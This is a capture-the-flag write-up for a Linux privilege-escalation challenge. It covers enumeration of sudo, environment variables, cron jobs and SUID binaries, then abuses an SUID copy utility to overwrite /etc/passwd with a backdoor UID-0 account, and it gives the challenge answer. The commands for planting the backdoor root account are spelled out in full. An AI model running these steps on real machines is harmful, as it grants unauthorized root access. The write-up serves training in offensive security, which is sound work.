# Linux PrivEsc

This challenge is located in *Ostrich Saloon* on the *Island of Misfit Toys*. Speak to *Rose Mold* to start the challenge.

## Challenge Prompt

Once we open the terminal, we are greeted with the challenge prompt.

![Figure 1: Linux PrivEsc Challenge Prompt](/img/privesc-prompt.png)

We are currently running in the context of a standard non-privileged user account. Our goal is to elevate permissions to a super-user level and run an executable in the `/root` directory to complete the challenge. 

Before looking for privilege escalation vectors, we should perform some basic situational awareness checks.

```bash
id
hostname
pwd
ls -al
cat /etc/passwd
uname -a
```

![Figure 2: Gathering Basic Information](/img/privesc-basic.png)

## Enumeration

It is time to begin enumerating the file system for privilege escalation vectors. Typically, I search for the following low-hanging fruit privilege escalation opportunities first when evaluating a Linux target:
* `sudo`-abusable packages
* Plaintext credentials stored in environment variables or commnad history transcripts
* Abusable cron jobs
* Binaries with the SUID or the SGID bit set 

### Sudo Abuse

The first privilege escalation we check for is what commands we may run with `sudo`.

```bash
sudo -l
```

![Figure 3: Checking for `sudo` Abuse Vectors](/img/privesc-sudo.png)

It appears that the `sudo` package is not installed, so we will move on to other privilege escalation techniques.

### Environment Variables

Check for any sensitive information hardcoded as environment variables with `env`.

```bash
env
```

![Figure 4: Checking for Credentials Hardcoded as Credentials](/img/privesc-env.png)

None of the environment variables appear to be representing credentials.

### Cron Job Abuse

Check what cron jobs are running on the target. Cron job scripts are stored in subdirectories of the `/etc/` directory named after their running cadence (e.g. `cron.daily` for daily scripts, `cron.weekly` for weekly scripts, etc).

```bash
ls -alh /etc/cron*
```

![Figure 5: Checking for Abusable Cron Jobs](/img/privesc-cron.png)

The `apt-compat` and `dpkg` cron jobs are default jobs in Linux and not exploitable, so we can move on.

### SUID and SGID Marked Binaries

Attempt to check for binaries that have been assigned the SUID or SGID bit.

```bash
find / -perm -u=s -type f 2>/dev/null

find / -perm -g=s -type f 2>/dev/null
```

![Figure 6: Checking for Binaries with the SUID or SGID Bits Enabled](/img/privesc-suid-sgid.png)


The binary `/usr/bin/simplecopy` stands out to me. Check its `--help` menu.

```bash
simplecopy --help
```

![Figure 7: Checking the Help Menu of `/usr/bin/simplecopy`](/img/privesc-help.png)

The utility seems to copy an item to a destination. 

If we can overwrite files with the `simplecopy` binary, then we may be able to escalate privileges by overwriting the contents of `/etc/passwd`. Validate that we can overwrite files by creating two test files and using the `simplecopy` utility on them.

```bash
echo 'test 1' > test1.txt
echo 'test 2' > test2.txt
simplecopy test2.txt test1.txt 
cat test1.txt 
```

![Figure 8: Testing out the `simplecopy` Binary](/img/privesc-test.png)

The overwrite seems to work. 

## Exploitation

This will be our attack methodology:
* We will generate a DESCrypt hash of a known plaintext that we will use as our backdoor account's password.
* We will make a copy of `/etc/passwd` and apppend a line to our copy creating a new *root* account using our hash as its password.
* We will use `simplecopy` to overwrite the contents of `/etc/passwd` with our malicious copy, then login to the backdoor account.
* With our attack concluded, we should revert our changes.

On my personal instance of Kali Linux, I used the `mkpasswd` utility to generate a DESCrypt hash, which is a supported hash algorithm by `/etc/passwd`. If this were a real engagement, we should use a strong password, since creating a backdoor account with a very weak password would introduce another critical vulnerability to the system. For this challenge however, I generated a hash for the password *yougotpwnedithappens*.

```bash
echo 'yougotpwnedithappens' | mkpasswd -m descrypt -s
```

![Figure 9: Generating a Password Hash with `mkpasswd`](/img/privesc-mkpasswd.png)

Back on the target machine, create a backup of `/etc/passwd` in case we need to roll back our changes.

```bash
cat /etc/passwd > /tmp/passwd.bak
```

![Figure 10: Creating a Backup of `/etc/passwd`](/img/privesc-backup.md)

Continue with the attack by create a writeable copy of `/etc/passwd`, append the new line to `/etc/passwd` that adds a new superuser with our generated password, and validate its contents.

```bash
cat /etc/passwd > /tmp/passwd
echo 'root2:J68/tUveONM2s:0:0:root:/root:/bin/bash' >> /tmp/passwd
cat /etc/passwd
```

![Figure 11: Creating a Malicious Copy of `/etc/passwd`](/img/privesc-malicious-passwd.png)

With our malicious `/etc/passwd` file prepared, we can now overwrite the contents of `/etc/passwd`.

```bash
simplecopy /tmp/passwd /etc/passwd
```

![Figure 12: Overwriting the Contents of `/etc/passwd`](/imig/privesc-overwrite.png)

Now when we attempt to authenticate as *root2*, we should enter a shell running in the context of *root*.

```bash
su root2 - # Enter our password via STDIN
```

![Figure 13: Opening a New Session as *root2*](/img/privesc-exploited.png)

We are now running in a shell as *root*. Move to the directory `/root` and run the binary to complete the lab. The answer to the question is "santa", of course!

```bash
cd /root
ls -al
./runmetoanswer 
```

![Figure 14: Running the `runmetoanswer` Binary](/img/privesc-runmetoanswer.png)

Finally, we should exit the *root* shell and replace the current contents of `/etc/passwd` with the `/tmp/passwd.bak` backup file we created earlier. This ensures that we left the target machine the way we left it at the beginning of the engagement. We could also consider patching the vulnerability, but that might result in unintended broken functionality, so we will leave the binary alone for now.

```bash
exit
simplecopy /tmp/passwd.bak /etc/passwd
cat /etc/passwd
```

![Figure 15: House Cleaning Operations](/img/privesc-house-cleaning.png)
